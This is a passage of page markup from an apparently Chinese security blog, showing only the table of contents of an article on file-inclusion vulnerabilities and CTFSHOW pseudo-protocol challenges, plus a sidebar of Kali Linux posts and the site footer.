class="toc-number">1.0.1.6.</span> <span class="toc-text">6、黑盒分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.1.7.</span> <span class="toc-text">7、利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.1.7.1.</span> <span class="toc-text">本地利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.0.1.7.1.1.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.0.1.7.1.2.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.0.1.7.1.3.</span> <span class="toc-text">代码执行</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%88%A9%E7%94%A8-VULWEB-%E6%9C%89%E6%97%A0%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.2.</span> <span class="toc-text">#黑盒利用-VULWEB-有无包含文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E5%88%A9%E7%94%A8-CTFSHOW-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95"><span class="toc-number">1.0.3.</span> <span class="toc-text">#白盒利用-CTFSHOW-伪协议玩法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#78-php-http%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">78-php&amp;http协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#79-data-http%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">79-data&amp;http协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#80-81-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">80 81-日志包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#87-php-filter-write-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%EF%BC%88%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%8C%E4%BA%8C%E6%AC%A1%E8%A7%A3%E5%AF%86%EF%BC%89"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码（文件写入，二次解密）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#88-data-base64%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.0.3.5.</span> <span class="toc-text">88-data&amp;base64协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#117-php-filter-write"><span class="toc-number">1.0.3.6.</span> <span class="toc-text">117-php:&#x2F;&#x2F;filter&#x2F;write</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/(eval)1%20_python-argcomplete%20function%20definition%20file%20not%20found/" title="(eval)1 _python-argcomplete function definition file not found"><img src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="(eval)1 _python-argcomplete function definition file not found"/></a><div class="content"><a class="title" href="/2025/09/16/(eval)1%20_python-argcomplete%20function%20definition%20file%20not%20found/" title="(eval)1 _python-argcomplete function definition file not found">(eval)1 _python-argcomplete function definition file not found</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/Kali%20Linux%20%E7%B3%BB%E7%BB%9F%E5%9C%A8%E6%89%A7%E8%A1%8C%20sudo%20apt-get%20update%20%E6%97%B6%E5%87%BA%E7%8E%B0%E4%BA%86%20GPG%20%E5%85%AC%E9%92%A5%E7%BC%BA%E5%A4%B1%E9%94%99%E8%AF%AF/" title="Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误"><img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误"/></a><div class="content"><a class="title" href="/2025/09/16/Kali%20Linux%20%E7%B3%BB%E7%BB%9F%E5%9C%A8%E6%89%A7%E8%A1%8C%20sudo%20apt-get%20update%20%E6%97%B6%E5%87%BA%E7%8E%B0%E4%BA%86%20GPG%20%E5%85%AC%E9%92%A5%E7%BC%BA%E5%A4%B1%E9%94%99%E8%AF%AF/" title="Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误">Kali Linux 系统在执行 sudo apt-get update 时出现了 GPG 公钥缺失错误</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/Kali%20%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE/" title="Kali 字体大小设置"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="Kali 字体大小设置"/></a><div class="content"><a class="title" href="/2025/09/16/Kali%20%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE/" title="Kali 字体大小设置">Kali 字体大小设置</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/Kali%E7%9A%84KDE%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E5%90%AF%E7%94%A8%E4%BB%8E%E4%B8%BB%E6%9C%BA%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B7%A8%E7%B3%BB%E7%BB%9F%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%8B%96%E5%8A%A8%E6%96%87%E4%BB%B6%E6%95%99%E7%A8%8B/" title="Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程"><img src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程"/></a><div class="content"><a class="title" href="/2025/09/16/Kali%E7%9A%84KDE%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83%E5%90%AF%E7%94%A8%E4%BB%8E%E4%B8%BB%E6%9C%BA%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B7%A8%E7%B3%BB%E7%BB%9F%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%8B%96%E5%8A%A8%E6%96%87%E4%BB%B6%E6%95%99%E7%A8%8B/" title="Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程">Kali的KDE桌面环境启用从主机向虚拟机跨系统复制粘贴拖动文件教程</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/16/OutGuess%20%E5%AE%89%E8%A3%85%E4%B8%8E%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%E6%8C%87%E5%8D%97%EF%BC%88Kali%20Linux%20%E7%8E%AF%E5%A2%83%EF%BC%89/" title="OutGuess 安装与问题排查指南（Kali Linux 环境）"><img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15ffjaj31hc0xcqth.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="OutGuess 安装与问题排查指南（Kali Linux 环境）"/></a><div class="content"><a class="title" href="/2025/09/16/OutGuess%20%E5%AE%89%E8%A3%85%E4%B8%8E%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%E6%8C%87%E5%8D%97%EF%BC%88Kali%20Linux%20%E7%8E%AF%E5%A2%83%EF%BC%89/" title="OutGuess 安装与问题排查指南（Kali Linux 环境）">OutGuess 安装与问题排查指南（Kali Linux 环境）</a><time datetime="2025-09-16T07:48:08.000Z" title="发表于 2025-09-16 15:48:08">2025-09-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 0xMouise</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div><div class="footer_custom_text">如果身体是瑕疵的半成品 那就让灵魂成为永远燃烧的永动机</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="用我三生烟火，换你一世迷离,长街长，烟花繁，你挑灯回看,回得了过去，回不了当初,抬头看，人生是星辰大海,当你想要放弃时，想想当初为什么开始,因为现在的坚持正在重塑未来的你,抬头看，人生是星辰大海,你最大的冒险，是过你梦想的生活,等待完美条件的人永远无法开始,认知的边界就是命运的边界,在长大，在失去，在努力，在接受，在好好生活,如果身体是瑕疵的半成品 那就让灵魂成为永远燃烧的永动机,纵有狂风拔地起 我亦乘风破万里,汗水不会辜负你的期待,享受你每一次锻炼完后的肌肉酸痛,因为这意味昨天那个预示着懦弱你的已经被你杀死了,肌肉的酸痛预示着懦弱的离场,当你快坚持不住的时候 困难也快坚持不住了,有些事不是看到了希望才努力，而是努力了才看到了希望,在无人问津的地方历练，在万众瞩目的地方出现,破茧成蝶必经淬炼,一颗向上跳动的心脏，不该有一副下坠的躯体,向下的躯体无法承载向上的灵魂,一个人要想成长你的意志力和身体都得尽力磨砺,宝剑锋从磨砺出梅花香自苦寒来" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
